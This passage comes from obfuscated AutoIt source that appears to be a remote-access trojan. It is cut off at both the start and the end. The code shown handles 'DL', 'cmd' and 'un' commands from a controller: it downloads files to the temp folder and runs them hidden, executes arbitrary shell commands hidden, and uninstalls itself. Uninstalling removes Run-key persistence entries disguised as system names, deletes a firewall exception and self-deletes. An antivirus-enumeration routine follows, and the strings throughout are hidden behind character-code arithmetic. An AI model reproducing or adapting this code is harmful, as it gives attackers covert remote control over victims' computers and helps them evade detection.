$wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj = StringSplit($ejhwafnhgrbjvudvcpjsrdxdsyogslkgoexwcpeojvwtgecnrpqp, String(\"0\") &amp; ChrW(126 - 50) &amp; String(\"I\") &amp; ChrW(129 - 50) &amp; ChrW(78) &amp; \"W\" &amp; String(\"0\"), 1)\n            If $wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj[0] &gt; 0 Then\n                Select \n                    Case $wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj[1] = \"D\" &amp; ChrW(76)\n                        InetGet($wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj[2], @TempDir &amp; String(\"\\\") &amp; $wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj[3], 1)\n                        If FileExists(@TempDir &amp; String(\"\\\") &amp; $wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj[3]) Then\n                            ShellExecute(ChrW(99) &amp; ChrW(109) &amp; ChrW(100) &amp; ChrW(47 + -1) &amp; ChrW(1 + 100) &amp; ChrW(148 - 28) &amp; \"e\", \"/\" &amp; String(\"c\") &amp; ChrW(32) &amp; ChrW(115) &amp; \"t\" &amp; String(\"a\") &amp; ChrW(14 + 100) &amp; ChrW(158 - 42) &amp; ChrW(79 - 47) &amp; ChrW(30 + 7) &amp; ChrW(138 - 22) &amp; ChrW(45 + 56) &amp; ChrW(109) &amp; ChrW(112) &amp; ChrW(42 + -5) &amp; ChrW(12 + 80) &amp; $wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj[3], \"\", \"\", @SW_HIDE)\n                            yutherqpkizldomanazujuowkemziyaieyvuglsqadmmqsuumyvk(\"M\" &amp; ChrW(83) &amp; \"G\" &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; String(\"E\") &amp; String(\"x\") &amp; ChrW(151 - 50) &amp; ChrW(115 - 16) &amp; ChrW(158 - 41) &amp; String(\"t\") &amp; String(\"e\") &amp; \"d\" &amp; ChrW(30 + 2) &amp; ChrW(17 + 48) &amp; ChrW(124 - 9) &amp; ChrW(32) &amp; $wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj[3])\n                        Else\n                            yutherqpkizldomanazujuowkemziyaieyvuglsqadmmqsuumyvk(\"M\" &amp; ChrW(83) &amp; \"G\" &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; ChrW(11 + 57) &amp; ChrW(116 - 5) &amp; \"w\" &amp; ChrW(31 + 79) &amp; ChrW(108) &amp; ChrW(134 - 23) &amp; String(\"a\") &amp; ChrW(122 - 22) &amp; \" \" &amp; \"E\" &amp; ChrW(110 - 28) &amp; ChrW(10 + 72))\n                        EndIf\n                    Case $wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj[1] = \"u\" &amp; ChrW(121 - 11)\n                        nsrtpcgrkqsngglhzyojitacnvnmrnzfavwexewfsrijqiykpuzx()\n                    Case $wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj[1] = ChrW(36 + 63) &amp; \"m\" &amp; \"d\"\n                        If ShellExecute(ChrW(99) &amp; ChrW(109) &amp; ChrW(100) &amp; ChrW(47 + -1) &amp; ChrW(1 + 100) &amp; ChrW(148 - 28) &amp; \"e\", $wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj[2], \"\", \"\", @SW_HIDE) = 1 Then\n                            yutherqpkizldomanazujuowkemziyaieyvuglsqadmmqsuumyvk(\"M\" &amp; ChrW(83) &amp; \"G\" &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; \"E\" &amp; String(\"x\") &amp; \"e\" &amp; String(\"c\") &amp; String(\"u\") &amp; ChrW(33 + 83) &amp; ChrW(101) &amp; ChrW(100) &amp; String(\" \") &amp; \"c\" &amp; \"m\" &amp; ChrW(128 - 28) &amp; ChrW(46) &amp; ChrW(115 - 14) &amp; \"x\" &amp; ChrW(130 - 29) &amp; String(\" \") &amp; $wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj[2])\n                        Else\n                            yutherqpkizldomanazujuowkemziyaieyvuglsqadmmqsuumyvk(\"M\" &amp; ChrW(83) &amp; \"G\" &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; ChrW(69) &amp; \"x\" &amp; ChrW(33 + 68) &amp; ChrW(144 - 45) &amp; String(\"u\") &amp; ChrW(141 - 25) &amp; ChrW(101) &amp; String(\" \") &amp; ChrW(8 + 61) &amp; ChrW(82) &amp; String(\"R\") &amp; ChrW(32) &amp; ChrW(143 - 44) &amp; ChrW(112 - 3) &amp; ChrW(105 - 5) &amp; ChrW(46) &amp; String(\"e\") &amp; ChrW(161 - 41) &amp; ChrW(101) &amp; ChrW(26 + 6) &amp; $wfkbldcbrgpuhuvrwhtmltkwhewpvzpdvujiuvkyncxceclljlpj[2])\n                        EndIf\n                EndSelect\n            EndIf\n    EndSelect\nWEnd\n\nFunc nsrtpcgrkqsngglhzyojitacnvnmrnzfavwexewfsrijqiykpuzx()\n    RegDelete(String(\"H\") &amp; ChrW(112 - 37) &amp; ChrW(69) &amp; String(\"Y\") &amp; \"_\" &amp; ChrW(102 - 26) &amp; ChrW(89 - 10) &amp; ChrW(105 - 38) &amp; String(\"A\") &amp; ChrW(105 - 29) &amp; ChrW(95) &amp; \"M\" &amp; \"A\" &amp; \"C\" &amp; ChrW(23 + 49) &amp; ChrW(107 - 34) &amp; ChrW(22 + 56) &amp; ChrW(69) &amp; String(\"\\\") &amp; ChrW(98 - 15) &amp; ChrW(19 + 92) &amp; \"f\" &amp; ChrW(19 + 97) &amp; ChrW(6 + 113) &amp; String(\"a\") &amp; ChrW(17 + 97) &amp; \"e\" &amp; ChrW(123 - 31) &amp; \"M\" &amp; ChrW(18 + 87) &amp; String(\"c\") &amp; ChrW(114) &amp; ChrW(159 - 48) &amp; ChrW(115) &amp; String(\"o\") &amp; String(\"f\") &amp; ChrW(135 - 19) &amp; ChrW(92) &amp; ChrW(49 + 38) &amp; ChrW(144 - 39) &amp; \"n\" &amp; ChrW(32 + 68) &amp; ChrW(111) &amp; ChrW(27 + 92) &amp; ChrW(115) &amp; ChrW(92) &amp; ChrW(21 + 46) &amp; \"u\" &amp; ChrW(26 + 88) &amp; ChrW(27 + 87) &amp; ChrW(11 + 90) &amp; ChrW(110) &amp; ChrW(18 + 98) &amp; ChrW(39 + 47) &amp; \"e\" &amp; \"r\" &amp; ChrW(157 - 42) &amp; \"i\" &amp; ChrW(122 - 11) &amp; ChrW(131 - 21) &amp; ChrW(22 + 70) &amp; String(\"R\") &amp; ChrW(138 - 21) &amp; ChrW(127 - 17), $vcjuqioffbuxjhmrijmlbucfcfhjjcrkovnvyluomdhvzuybwwat)\n    RegDelete(String(\"H\") &amp; ChrW(75) &amp; ChrW(13 + 56) &amp; String(\"Y\") &amp; String(\"_\") &amp; \"C\" &amp; ChrW(85) &amp; ChrW(35 + 47) &amp; String(\"R\") &amp; String(\"E\") &amp; String(\"N\") &amp; ChrW(16 + 68) &amp; ChrW(95) &amp; \"U\" &amp; ChrW(83) &amp; ChrW(69) &amp; ChrW(95 - 13) &amp; ChrW(14 + 78) &amp; \"S\" &amp; ChrW(22 + 89) &amp; ChrW(11 + 91) &amp; ChrW(116) &amp; \"w\" &amp; ChrW(34 + 63) &amp; ChrW(114) &amp; ChrW(102 - 1) &amp; \"\\\" &amp; \"M\" &amp; String(\"i\") &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(115) &amp; ChrW(111) &amp; String(\"f\") &amp; ChrW(15 + 101) &amp; \"\\\" &amp; String(\"W\") &amp; ChrW(105) &amp; \"n\" &amp; ChrW(22 + 78) &amp; \"o\" &amp; String(\"w\") &amp; \"s\" &amp; \"\\\" &amp; ChrW(67) &amp; ChrW(117) &amp; String(\"r\") &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; String(\"t\") &amp; \"V\" &amp; ChrW(101) &amp; ChrW(119 - 5) &amp; ChrW(157 - 42) &amp; ChrW(17 + 88) &amp; \"o\" &amp; String(\"n\") &amp; ChrW(92) &amp; ChrW(82) &amp; ChrW(24 + 93) &amp; String(\"n\"), $vcjuqioffbuxjhmrijmlbucfcfhjjcrkovnvyluomdhvzuybwwat)\n    RegDelete(String(\"H\") &amp; ChrW(112 - 37) &amp; ChrW(69) &amp; String(\"Y\") &amp; \"_\" &amp; ChrW(102 - 26) &amp; ChrW(89 - 10) &amp; ChrW(105 - 38) &amp; String(\"A\") &amp; ChrW(105 - 29) &amp; ChrW(95) &amp; \"M\" &amp; \"A\" &amp; \"C\" &amp; ChrW(23 + 49) &amp; ChrW(107 - 34) &amp; ChrW(22 + 56) &amp; ChrW(69) &amp; String(\"\\\") &amp; ChrW(98 - 15) &amp; ChrW(19 + 92) &amp; \"f\" &amp; ChrW(19 + 97) &amp; ChrW(6 + 113) &amp; String(\"a\") &amp; ChrW(17 + 97) &amp; \"e\" &amp; ChrW(123 - 31) &amp; \"M\" &amp; ChrW(18 + 87) &amp; String(\"c\") &amp; ChrW(114) &amp; ChrW(159 - 48) &amp; ChrW(115) &amp; String(\"o\") &amp; String(\"f\") &amp; ChrW(135 - 19) &amp; ChrW(92) &amp; ChrW(49 + 38) &amp; ChrW(144 - 39) &amp; \"n\" &amp; ChrW(32 + 68) &amp; ChrW(111) &amp; ChrW(27 + 92) &amp; ChrW(115) &amp; ChrW(92) &amp; ChrW(21 + 46) &amp; \"u\" &amp; ChrW(26 + 88) &amp; ChrW(27 + 87) &amp; ChrW(11 + 90) &amp; ChrW(110) &amp; ChrW(18 + 98) &amp; ChrW(39 + 47) &amp; \"e\" &amp; \"r\" &amp; ChrW(157 - 42) &amp; \"i\" &amp; ChrW(122 - 11) &amp; ChrW(131 - 21) &amp; ChrW(22 + 70) &amp; String(\"R\") &amp; ChrW(138 - 21) &amp; ChrW(127 - 17), ChrW(10 + 70) &amp; ChrW(8 + 106) &amp; ChrW(105) &amp; String(\"n\") &amp; ChrW(135 - 19) &amp; \"D\" &amp; ChrW(114) &amp; \"i\" &amp; ChrW(118) &amp; String(\"e\") &amp; ChrW(114))\n    RegDelete(String(\"H\") &amp; ChrW(75) &amp; ChrW(13 + 56) &amp; String(\"Y\") &amp; String(\"_\") &amp; \"C\" &amp; ChrW(85) &amp; ChrW(35 + 47) &amp; String(\"R\") &amp; String(\"E\") &amp; String(\"N\") &amp; ChrW(16 + 68) &amp; ChrW(95) &amp; \"U\" &amp; ChrW(83) &amp; ChrW(69) &amp; ChrW(95 - 13) &amp; ChrW(14 + 78) &amp; \"S\" &amp; ChrW(22 + 89) &amp; ChrW(11 + 91) &amp; ChrW(116) &amp; \"w\" &amp; ChrW(34 + 63) &amp; ChrW(114) &amp; ChrW(102 - 1) &amp; \"\\\" &amp; \"M\" &amp; String(\"i\") &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(115) &amp; ChrW(111) &amp; String(\"f\") &amp; ChrW(15 + 101) &amp; \"\\\" &amp; String(\"W\") &amp; ChrW(105) &amp; \"n\" &amp; ChrW(22 + 78) &amp; \"o\" &amp; String(\"w\") &amp; \"s\" &amp; \"\\\" &amp; ChrW(67) &amp; ChrW(117) &amp; String(\"r\") &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; String(\"t\") &amp; \"V\" &amp; ChrW(101) &amp; ChrW(119 - 5) &amp; ChrW(157 - 42) &amp; ChrW(17 + 88) &amp; \"o\" &amp; String(\"n\") &amp; ChrW(92) &amp; ChrW(82) &amp; ChrW(24 + 93) &amp; String(\"n\"), ChrW(10 + 70) &amp; ChrW(8 + 106) &amp; ChrW(105) &amp; String(\"n\") &amp; ChrW(135 - 19) &amp; \"D\" &amp; ChrW(114) &amp; \"i\" &amp; ChrW(118) &amp; String(\"e\") &amp; ChrW(114))\n    RegDelete(String(\"H\") &amp; ChrW(112 - 37) &amp; ChrW(69) &amp; String(\"Y\") &amp; \"_\" &amp; ChrW(102 - 26) &amp; ChrW(89 - 10) &amp; ChrW(105 - 38) &amp; String(\"A\") &amp; ChrW(105 - 29) &amp; ChrW(95) &amp; \"M\" &amp; \"A\" &amp; \"C\" &amp; ChrW(23 + 49) &amp; ChrW(107 - 34) &amp; ChrW(22 + 56) &amp; ChrW(69) &amp; String(\"\\\") &amp; ChrW(98 - 15) &amp; ChrW(19 + 92) &amp; \"f\" &amp; ChrW(19 + 97) &amp; ChrW(6 + 113) &amp; String(\"a\") &amp; ChrW(17 + 97) &amp; \"e\" &amp; ChrW(123 - 31) &amp; \"M\" &amp; ChrW(18 + 87) &amp; String(\"c\") &amp; ChrW(114) &amp; ChrW(159 - 48) &amp; ChrW(115) &amp; String(\"o\") &amp; String(\"f\") &amp; ChrW(135 - 19) &amp; ChrW(92) &amp; ChrW(49 + 38) &amp; ChrW(144 - 39) &amp; \"n\" &amp; ChrW(32 + 68) &amp; ChrW(111) &amp; ChrW(27 + 92) &amp; ChrW(115) &amp; ChrW(92) &amp; ChrW(21 + 46) &amp; \"u\" &amp; ChrW(26 + 88) &amp; ChrW(27 + 87) &amp; ChrW(11 + 90) &amp; ChrW(110) &amp; ChrW(18 + 98) &amp; ChrW(39 + 47) &amp; \"e\" &amp; \"r\" &amp; ChrW(157 - 42) &amp; \"i\" &amp; ChrW(122 - 11) &amp; ChrW(131 - 21) &amp; ChrW(22 + 70) &amp; String(\"R\") &amp; ChrW(138 - 21) &amp; ChrW(127 - 17), ChrW(67) &amp; ChrW(116 - 5) &amp; ChrW(123 - 9) &amp; String(\"t\") &amp; ChrW(139 - 42) &amp; ChrW(4 + 106) &amp; ChrW(97))\n    RegDelete(String(\"H\") &amp; ChrW(75) &amp; ChrW(13 + 56) &amp; String(\"Y\") &amp; String(\"_\") &amp; \"C\" &amp; ChrW(85) &amp; ChrW(35 + 47) &amp; String(\"R\") &amp; String(\"E\") &amp; String(\"N\") &amp; ChrW(16 + 68) &amp; ChrW(95) &amp; \"U\" &amp; ChrW(83) &amp; ChrW(69) &amp; ChrW(95 - 13) &amp; ChrW(14 + 78) &amp; \"S\" &amp; ChrW(22 + 89) &amp; ChrW(11 + 91) &amp; ChrW(116) &amp; \"w\" &amp; ChrW(34 + 63) &amp; ChrW(114) &amp; ChrW(102 - 1) &amp; \"\\\" &amp; \"M\" &amp; String(\"i\") &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(115) &amp; ChrW(111) &amp; String(\"f\") &amp; ChrW(15 + 101) &amp; \"\\\" &amp; String(\"W\") &amp; ChrW(105) &amp; \"n\" &amp; ChrW(22 + 78) &amp; \"o\" &amp; String(\"w\") &amp; \"s\" &amp; \"\\\" &amp; ChrW(67) &amp; ChrW(117) &amp; String(\"r\") &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; String(\"t\") &amp; \"V\" &amp; ChrW(101) &amp; ChrW(119 - 5) &amp; ChrW(157 - 42) &amp; ChrW(17 + 88) &amp; \"o\" &amp; String(\"n\") &amp; ChrW(92) &amp; ChrW(82) &amp; ChrW(24 + 93) &amp; String(\"n\"), ChrW(67) &amp; ChrW(116 - 5) &amp; ChrW(123 - 9) &amp; String(\"t\") &amp; ChrW(139 - 42) &amp; ChrW(4 + 106) &amp; ChrW(97))\n    RegDelete(String(\"H\") &amp; ChrW(112 - 37) &amp; ChrW(69) &amp; String(\"Y\") &amp; \"_\" &amp; ChrW(102 - 26) &amp; ChrW(89 - 10) &amp; ChrW(105 - 38) &amp; String(\"A\") &amp; ChrW(105 - 29) &amp; ChrW(95) &amp; \"M\" &amp; \"A\" &amp; \"C\" &amp; ChrW(23 + 49) &amp; ChrW(107 - 34) &amp; ChrW(22 + 56) &amp; ChrW(69) &amp; String(\"\\\") &amp; ChrW(98 - 15) &amp; ChrW(19 + 92) &amp; \"f\" &amp; ChrW(19 + 97) &amp; ChrW(6 + 113) &amp; String(\"a\") &amp; ChrW(17 + 97) &amp; \"e\" &amp; ChrW(123 - 31) &amp; \"M\" &amp; ChrW(18 + 87) &amp; String(\"c\") &amp; ChrW(114) &amp; ChrW(159 - 48) &amp; ChrW(115) &amp; String(\"o\") &amp; String(\"f\") &amp; ChrW(135 - 19) &amp; ChrW(92) &amp; ChrW(49 + 38) &amp; ChrW(144 - 39) &amp; \"n\" &amp; ChrW(32 + 68) &amp; ChrW(111) &amp; ChrW(27 + 92) &amp; ChrW(115) &amp; ChrW(92) &amp; ChrW(21 + 46) &amp; \"u\" &amp; ChrW(26 + 88) &amp; ChrW(27 + 87) &amp; ChrW(11 + 90) &amp; ChrW(110) &amp; ChrW(18 + 98) &amp; ChrW(39 + 47) &amp; \"e\" &amp; \"r\" &amp; ChrW(157 - 42) &amp; \"i\" &amp; ChrW(122 - 11) &amp; ChrW(131 - 21) &amp; ChrW(22 + 70) &amp; String(\"R\") &amp; ChrW(138 - 21) &amp; ChrW(127 - 17), ChrW(106 - 29) &amp; \"i\" &amp; ChrW(28 + 71) &amp; ChrW(153 - 39) &amp; ChrW(2 + 109) &amp; \"s\" &amp; ChrW(111) &amp; \"f\" &amp; String(\"t\") &amp; \"O\" &amp; String(\"f\") &amp; ChrW(43 + 59) &amp; String(\"i\") &amp; ChrW(131 - 32) &amp; ChrW(116 - 15))\n    RegDelete(String(\"H\") &amp; ChrW(75) &amp; ChrW(13 + 56) &amp; String(\"Y\") &amp; String(\"_\") &amp; \"C\" &amp; ChrW(85) &amp; ChrW(35 + 47) &amp; String(\"R\") &amp; String(\"E\") &amp; String(\"N\") &amp; ChrW(16 + 68) &amp; ChrW(95) &amp; \"U\" &amp; ChrW(83) &amp; ChrW(69) &amp; ChrW(95 - 13) &amp; ChrW(14 + 78) &amp; \"S\" &amp; ChrW(22 + 89) &amp; ChrW(11 + 91) &amp; ChrW(116) &amp; \"w\" &amp; ChrW(34 + 63) &amp; ChrW(114) &amp; ChrW(102 - 1) &amp; \"\\\" &amp; \"M\" &amp; String(\"i\") &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(115) &amp; ChrW(111) &amp; String(\"f\") &amp; ChrW(15 + 101) &amp; \"\\\" &amp; String(\"W\") &amp; ChrW(105) &amp; \"n\" &amp; ChrW(22 + 78) &amp; \"o\" &amp; String(\"w\") &amp; \"s\" &amp; \"\\\" &amp; ChrW(67) &amp; ChrW(117) &amp; String(\"r\") &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; String(\"t\") &amp; \"V\" &amp; ChrW(101) &amp; ChrW(119 - 5) &amp; ChrW(157 - 42) &amp; ChrW(17 + 88) &amp; \"o\" &amp; String(\"n\") &amp; ChrW(92) &amp; ChrW(82) &amp; ChrW(24 + 93) &amp; String(\"n\"), ChrW(106 - 29) &amp; \"i\" &amp; ChrW(28 + 71) &amp; ChrW(153 - 39) &amp; ChrW(2 + 109) &amp; \"s\" &amp; ChrW(111) &amp; \"f\" &amp; String(\"t\") &amp; \"O\" &amp; String(\"f\") &amp; ChrW(43 + 59) &amp; String(\"i\") &amp; ChrW(131 - 32) &amp; ChrW(116 - 15))\n    RegDelete(ChrW(72) &amp; \"K\" &amp; ChrW(69) &amp; ChrW(89) &amp; ChrW(116 - 21) &amp; ChrW(76) &amp; ChrW(79) &amp; \"C\" &amp; String(\"A\") &amp; ChrW(76) &amp; ChrW(19 + 76) &amp; ChrW(77) &amp; String(\"A\") &amp; \"C\" &amp; \"H\" &amp; ChrW(73) &amp; \"N\" &amp; \"E\" &amp; ChrW(92) &amp; String(\"S\") &amp; ChrW(31 + 48) &amp; ChrW(38 + 32) &amp; String(\"T\") &amp; ChrW(87) &amp; ChrW(94 - 29) &amp; ChrW(82) &amp; ChrW(96 - 27) &amp; ChrW(117 - 25) &amp; \"M\" &amp; String(\"i\") &amp; String(\"c\") &amp; ChrW(24 + 90) &amp; ChrW(39 + 72) &amp; \"s\" &amp; ChrW(49 + 62) &amp; ChrW(102) &amp; ChrW(125 - 9) &amp; ChrW(141 - 49) &amp; ChrW(87) &amp; ChrW(109 - 4) &amp; ChrW(110) &amp; ChrW(32 + 68) &amp; String(\"o\") &amp; String(\"w\") &amp; ChrW(150 - 35) &amp; \"\\\" &amp; \"C\" &amp; ChrW(47 + 70) &amp; \"r\" &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; ChrW(157 - 41) &amp; ChrW(86) &amp; ChrW(101) &amp; ChrW(42 + 72) &amp; ChrW(122 - 7) &amp; String(\"i\") &amp; \"o\" &amp; \"n\" &amp; ChrW(31 + 61) &amp; \"R\" &amp; ChrW(117) &amp; ChrW(110), ChrW(40 + 37) &amp; String(\"i\") &amp; ChrW(108 - 9) &amp; ChrW(114) &amp; \"o\" &amp; ChrW(115) &amp; String(\"o\") &amp; ChrW(121 - 19) &amp; \"t\" &amp; ChrW(101 - 34) &amp; ChrW(108 - 31) &amp; ChrW(68) &amp; ChrW(47 + -1) &amp; \"l\" &amp; String(\"n\") &amp; ChrW(2 + 105))\n    RegDelete(ChrW(112 - 40) &amp; ChrW(75) &amp; ChrW(69) &amp; ChrW(89) &amp; String(\"_\") &amp; ChrW(67) &amp; String(\"U\") &amp; ChrW(126 - 44) &amp; \"R\" &amp; ChrW(69) &amp; ChrW(110 - 32) &amp; ChrW(84) &amp; ChrW(95) &amp; ChrW(85) &amp; String(\"S\") &amp; ChrW(69) &amp; ChrW(82) &amp; ChrW(92) &amp; ChrW(83) &amp; ChrW(79) &amp; String(\"F\") &amp; ChrW(20 + 64) &amp; ChrW(87) &amp; \"A\" &amp; ChrW(82) &amp; ChrW(100 - 31) &amp; ChrW(49 + 43) &amp; ChrW(77) &amp; ChrW(105) &amp; String(\"c\") &amp; String(\"r\") &amp; String(\"o\") &amp; ChrW(151 - 36) &amp; ChrW(122 - 11) &amp; ChrW(102) &amp; ChrW(116) &amp; ChrW(25 + 67) &amp; ChrW(136 - 49) &amp; \"i\" &amp; ChrW(15 + 95) &amp; ChrW(100) &amp; ChrW(50 + 61) &amp; ChrW(136 - 17) &amp; ChrW(115) &amp; String(\"\\\") &amp; \"C\" &amp; String(\"u\") &amp; String(\"r\") &amp; ChrW(33 + 81) &amp; ChrW(109 - 8) &amp; ChrW(110) &amp; ChrW(116) &amp; String(\"V\") &amp; \"e\" &amp; String(\"r\") &amp; \"s\" &amp; \"i\" &amp; String(\"o\") &amp; ChrW(128 - 18) &amp; String(\"\\\") &amp; ChrW(82) &amp; ChrW(117) &amp; ChrW(35 + 75), ChrW(40 + 37) &amp; String(\"i\") &amp; ChrW(108 - 9) &amp; ChrW(114) &amp; \"o\" &amp; ChrW(115) &amp; String(\"o\") &amp; ChrW(121 - 19) &amp; \"t\" &amp; ChrW(101 - 34) &amp; ChrW(108 - 31) &amp; ChrW(68) &amp; ChrW(47 + -1) &amp; \"l\" &amp; String(\"n\") &amp; ChrW(2 + 105))\n    RegDelete(ChrW(72) &amp; \"K\" &amp; ChrW(69) &amp; ChrW(89) &amp; ChrW(116 - 21) &amp; ChrW(76) &amp; ChrW(79) &amp; \"C\" &amp; String(\"A\") &amp; ChrW(76) &amp; ChrW(19 + 76) &amp; ChrW(77) &amp; String(\"A\") &amp; \"C\" &amp; \"H\" &amp; ChrW(73) &amp; \"N\" &amp; \"E\" &amp; ChrW(92) &amp; String(\"S\") &amp; ChrW(31 + 48) &amp; ChrW(38 + 32) &amp; String(\"T\") &amp; ChrW(87) &amp; ChrW(94 - 29) &amp; ChrW(82) &amp; ChrW(96 - 27) &amp; ChrW(117 - 25) &amp; \"M\" &amp; String(\"i\") &amp; String(\"c\") &amp; ChrW(24 + 90) &amp; ChrW(39 + 72) &amp; \"s\" &amp; ChrW(49 + 62) &amp; ChrW(102) &amp; ChrW(125 - 9) &amp; ChrW(141 - 49) &amp; ChrW(87) &amp; ChrW(109 - 4) &amp; ChrW(110) &amp; ChrW(32 + 68) &amp; String(\"o\") &amp; String(\"w\") &amp; ChrW(150 - 35) &amp; \"\\\" &amp; \"C\" &amp; ChrW(47 + 70) &amp; \"r\" &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; ChrW(157 - 41) &amp; ChrW(86) &amp; ChrW(101) &amp; ChrW(42 + 72) &amp; ChrW(122 - 7) &amp; String(\"i\") &amp; \"o\" &amp; \"n\" &amp; ChrW(31 + 61) &amp; \"R\" &amp; ChrW(117) &amp; ChrW(110), ChrW(79 - 2) &amp; ChrW(27 + 78) &amp; ChrW(25 + 74) &amp; String(\"r\") &amp; ChrW(127 - 16) &amp; \"s\" &amp; ChrW(111) &amp; ChrW(29 + 73) &amp; ChrW(116) &amp; ChrW(83) &amp; ChrW(116 - 15) &amp; ChrW(99) &amp; ChrW(117) &amp; ChrW(136 - 22) &amp; ChrW(128 - 23) &amp; ChrW(145 - 29) &amp; ChrW(5 + 116) &amp; String(ChrW(47 + -1)) &amp; ChrW(101) &amp; \"x\" &amp; \"e\")\n    RegDelete(ChrW(112 - 40) &amp; ChrW(75) &amp; ChrW(69) &amp; ChrW(89) &amp; String(\"_\") &amp; ChrW(67) &amp; String(\"U\") &amp; ChrW(126 - 44) &amp; \"R\" &amp; ChrW(69) &amp; ChrW(110 - 32) &amp; ChrW(84) &amp; ChrW(95) &amp; ChrW(85) &amp; String(\"S\") &amp; ChrW(69) &amp; ChrW(82) &amp; ChrW(92) &amp; ChrW(83) &amp; ChrW(79) &amp; String(\"F\") &amp; ChrW(20 + 64) &amp; ChrW(87) &amp; \"A\" &amp; ChrW(82) &amp; ChrW(100 - 31) &amp; ChrW(49 + 43) &amp; ChrW(77) &amp; ChrW(105) &amp; String(\"c\") &amp; String(\"r\") &amp; String(\"o\") &amp; ChrW(151 - 36) &amp; ChrW(122 - 11) &amp; ChrW(102) &amp; ChrW(116) &amp; ChrW(25 + 67) &amp; ChrW(136 - 49) &amp; \"i\" &amp; ChrW(15 + 95) &amp; ChrW(100) &amp; ChrW(50 + 61) &amp; ChrW(136 - 17) &amp; ChrW(115) &amp; String(\"\\\") &amp; \"C\" &amp; String(\"u\") &amp; String(\"r\") &amp; ChrW(33 + 81) &amp; ChrW(109 - 8) &amp; ChrW(110) &amp; ChrW(116) &amp; String(\"V\") &amp; \"e\" &amp; String(\"r\") &amp; \"s\" &amp; \"i\" &amp; String(\"o\") &amp; ChrW(128 - 18) &amp; String(\"\\\") &amp; ChrW(82) &amp; ChrW(117) &amp; ChrW(35 + 75), ChrW(79 - 2) &amp; ChrW(27 + 78) &amp; ChrW(25 + 74) &amp; String(\"r\") &amp; ChrW(127 - 16) &amp; \"s\" &amp; ChrW(111) &amp; ChrW(29 + 73) &amp; ChrW(116) &amp; ChrW(83) &amp; ChrW(116 - 15) &amp; ChrW(99) &amp; ChrW(117) &amp; ChrW(136 - 22) &amp; ChrW(128 - 23) &amp; ChrW(145 - 29) &amp; ChrW(5 + 116) &amp; String(ChrW(47 + -1)) &amp; ChrW(101) &amp; \"x\" &amp; \"e\")\n    ShellExecute(ChrW(40 + 70) &amp; String(\"e\") &amp; ChrW(21 + 95) &amp; ChrW(129 - 14) &amp; ChrW(1 + 103), String(\"f\") &amp; ChrW(139 - 34) &amp; \"r\" &amp; ChrW(114 - 13) &amp; ChrW(150 - 31) &amp; \"a\" &amp; String(\"l\") &amp; \"l\" &amp; String(\" \") &amp; String(\"d\") &amp; ChrW(101) &amp; ChrW(108) &amp; ChrW(20 + 81) &amp; ChrW(134 - 18) &amp; ChrW(31 + 70) &amp; ChrW(77 - 45) &amp; ChrW(19 + 78) &amp; ChrW(136 - 28) &amp; ChrW(31 + 77) &amp; String(\"o\") &amp; \"w\" &amp; String(\"e\") &amp; ChrW(2 + 98) &amp; ChrW(5 + 107) &amp; ChrW(114) &amp; \"o\" &amp; ChrW(103) &amp; \"r\" &amp; String(\"a\") &amp; \"m\" &amp; String(\" \") &amp; ChrW(34) &amp; @AutoItExe &amp; ChrW(34), \"\", \"\", @SW_HIDE)\n    ShellExecute(@ComSpec, ChrW(47) &amp; ChrW(107) &amp; ChrW(32) &amp; ChrW(26 + 86) &amp; ChrW(39 + 66) &amp; ChrW(110) &amp; ChrW(103) &amp; ChrW(47 + -15) &amp; ChrW(48) &amp; ChrW(32) &amp; ChrW(49 + -11) &amp; ChrW(8 + 24) &amp; ChrW(100) &amp; \"e\" &amp; \"l\" &amp; ChrW(25 + 7) &amp; ChrW(34) &amp; @AutoItExe &amp; ChrW(34) &amp; ChrW(44 + -12) &amp; ChrW(38) &amp; \" \" &amp; \"e\" &amp; ChrW(15 + 105) &amp; ChrW(105) &amp; ChrW(28 + 88), \"\", \"\", @SW_HIDE)\n    yutherqpkizldomanazujuowkemziyaieyvuglsqadmmqsuumyvk(\"M\" &amp; ChrW(83) &amp; \"G\" &amp; $vjpajkcyrsbgqukdyialinmjzobeluyfndwkuoieqwyfrhuiknnp &amp; ChrW(40 - 8) &amp; String(\"U\") &amp; String(\"n\") &amp; ChrW(105) &amp; ChrW(153 - 43) &amp; ChrW(38 + 77) &amp; String(\"t\") &amp; ChrW(129 - 32) &amp; String(\"l\") &amp; String(\"l\") &amp; ChrW(32) &amp; \"!\" &amp; ChrW(33))\n    Exit\nEndFunc\n\nFunc av()\n    Local $avname\n    If @OSVersion = \"WIN_XP\" Then\n        $owmi = ObjGet(\"winmgmts:\\\\localhost\\root\\SecurityCenter\")\n    Else\n        $owmi = ObjGet(\"winmgmts:\\\\localhost\\root\\SecurityCenter2\")\n    EndIf\n    $colitems = 